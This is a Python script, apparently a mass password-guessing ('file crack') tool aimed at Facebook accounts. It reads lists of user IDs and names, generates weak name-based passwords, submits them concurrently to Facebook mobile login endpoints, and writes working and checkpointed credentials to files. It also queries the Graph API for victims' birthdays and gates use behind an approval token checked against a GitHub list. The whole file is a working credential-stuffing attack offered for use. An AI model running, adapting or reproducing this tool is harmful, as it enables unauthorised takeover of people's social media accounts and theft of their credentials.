# TOOLS OWNER MD WAHID ISLAM BISHAL
# POWERFULLY PYTHON TOOLS OF BANGLADESH 
 
import os
try:
    import requests
except ImportError:
    print('\n Module requests !...\n')
    os.system('pip install requests')
 
try:
    import concurrent.futures
except ImportError:
    print('\n Module futures !...\n')
    os.system('pip install futures')
 
try:
    import bs4
except ImportError:
    print('\n Module bs4 !...\n')
    os.system('pip install bs4')
 
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
from concurrent.futures import ThreadPoolExecutor as KINGNASEER
from datetime import datetime
from bs4 import BeautifulSoup
 
 
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
 
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
 
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; KSA-LX9 Build/HONORKSA-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/337.0.0.32.118;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
def animate():
    os.system("clear")
    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
        if done:
            break
        sys.stdout.write(f'\r{N}[{O}├втм┬в{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}├втм┬в{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}├втм┬в{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}├втм┬в{N}] Loading ' + c)
        sys.stdout.write(f'\r{N}[{O}├втм┬в{N}] Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.03)
t = threading.Thread(target=animate)
t.start()
time.sleep(0.5)
done = True
 
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
 
def logo():
	print("""
 
.#####...######...####...##..##...####...##.....
.##..##....##....##......##..##..##..##..##.....
.#####.....##.....####...######..######..##.....
.##..##....##........##..##..##..##..##..##.....
.#####...######...####...##..##..##..##..######.
................................................
                                                        
                                                        

 
==================================================
    𝐂𝐎𝐃𝐄𝐃 𝐁𝐘 : 𝐁𝐈𝐒𝐇𝐀𝐋
    𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 : 𝟎𝟏𝟔𝟏𝟑𝟑𝟏𝟐𝟑𝟐𝟓    
    𝐅𝐁 𝐏𝐀𝐆𝐄  : 𝐃𝐄𝐀𝐓𝐇 𝐂𝐘𝐁𝐄𝐑 𝐀𝐑𝐌𝐘
==================================================           
              \x1b[1;41m\x1b[1;97mTERA BAB HO \x1b[1;0m""")
 
def reg():
    os.system('clear')
    logo()
    print ('')
    time.sleep(0.001) 
    try:
        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/WAHID-ISLAM-BISHAL/BEST-FILE-CLONE/main/Approved.txt').text
    if to in r:
        time.sleep(2)
        python_java()
    else:
        os.system('clear')
        logo()
        print('')
        print ('\tApproved Not Detected')
        print ('')
        print (' \033[1;97mToken: ' + to)
        print(' WhatsApp : +8801613312325')
        input('\033[1;97m Press Enter To Get Approval \033[1;92m(FOR FREE)')
        os.system("xdg-open https://m.me/abalxhodi.py")
        reg()
 
def reg2():
    os.system('clear')
    logo()
    print('')
    print ('\tApproval Not Detected')
    print('')
    id = uuid.uuid4().hex[:50]
    print (' Token : ' + id)
    print(' WhatsApp : +8801613312325')
    input(' Press Enter To Get Approval \033[1;92m(FOR FREE) ')
    os.system("xdg-open https://wa.me/+8801613312325")
    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
    sav.write(id)
    sav.close()
    reg()
 
 
 
def THESAJJAD(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        print('\n----------------------------------------------')
        print(' Crack Has Been Completed.')
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;92m SUCCESSFULL : %s --- \033[1;97m/sdcard/BISHAL-OK.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;92m CHECKPOINTS : %s --- \033[1;97m/sdcard/BISHAL-CP.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
        input(f"\n\033[1;97m Press Enter To Return To Main Menu ")
        python_java()
 
def python_java():
    os.system('clear')
    logo()
    ipm = requests.get(url_ip).json() 
    IP = ipm["origin"]
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;92m              DEATH  CYBER")
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;97m IP ADDRESS        [%s]\n"%(IP));time.sleep(0.01)
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print(" \033[1;94m             Dont Play With Me !")
    print(" \033[1;94m             Because I know I Can")
    print(" \033[1;94m                PLAY Better Than You")
    print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
    print("\033[1;97m [1] FILE CRACK")
    print("\033[1;91m [0] EXIT")
    print("")
    pepek = input('\033[1;97m Select : ')
    if pepek in['1','01']:
       __xyz__().janu(id)
            
 
class __xyz__:
 
    def __init__(self):
        self.id = []
 
    def janu(self,id):
        os.system('clear')
        logo()
        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
        print("              FILE CRACK MENU")
        print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
        print('')
        self.cnt = input('%s  TYPE FILE NAME :%s '%(P,K))
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        logo()
        input('%s  Press ENTER IF YOU WANT TO COUNTINUE PROCESS :%s '%(P,K))
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            os.system('clear')
            logo()
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print("\033[1;91              SELECT METHOD")
            print(" \033[1;92m ---------------------------------------------");time.sleep(0.03)
            print('')
            print(' [1] Method 1 (Quit Best)')
            print(' [2] Method 2 (Best)')
            chi = input('  Choose method: ')
            self.__pler__()
        else:
            print(' WRONG INPUT ');self.janu(id)
    def __metode__(self, user, __chi__, chachaji):
        global ok,cp,loop
        sys.stdout.write(f'\r [THE BISHAL] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":chachaji,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (MeeGoNokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{chachaji}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":chachaji,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+chachaji,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/97.0.4674.2 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+chachaji+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{chachaji}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r{H} [BISHAL-OK] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('/sdcard/BISHAL-OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;94m[BISHAL-CP] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/BISHAL-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s \033[1;94m[BISHAL-CP] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('/sdcard/BISHAL-CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
 
            loop+=1
        except:
            self.__metode__(user, pw, chachaji)
    def __pler__(self):
        chi = ('2')
        if chi == '':
            print('\nSelect Correct One');self.__pler__()
        elif chi in ('1', '01'):
            os.system('clear')
            logo()
            print('')
            print(' \033[1;49;39m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;93m USE FLIGHT MODE IF SPEED ARE SLOW ')
            print(' \033[1;92m IN THE BACKGROUND ')
            print('-------------------------------------------')
            print('')
            with KINGNASEER(max_workers=30) as kirim:
                for thankme in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = thankme.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
 
            THESAJJAD(OK,cp)
        elif chi in ('2', '02'):
 
            os.system('clear')
            logo()
            print('')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print(' \033[1;97m TOTAL IDZ : %s%s' %(len(self.id),O))
            print(' \033[1;91m USE FLIGHT MODE IF SPEED ARE SELOW')
            print(' \033[1;92m CRACK HAS BEEN STARTED')
            print(" \033[1;97m ---------------------------------------------");time.sleep(0.03)
            print('')
            with KINGNASEER(max_workers=30) as kirim:
                for thankme in self.id: # CHECK_THE_POWER_OF_YOUR_DAD
                    try:
                        uid, name = thankme.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345",xz[0]+"1234",xz[0]+"123456"]
                        kirim.submit(self.__metode__, uid, pwx, "x.facebook.com")
                    except:
                        pass
 
            THESAJJAD(OK,cp)
        else:
            print('\n Select Valid One');self.__pler__()
 
 
if __name__ == '__main__':
    reg()
 
 
u
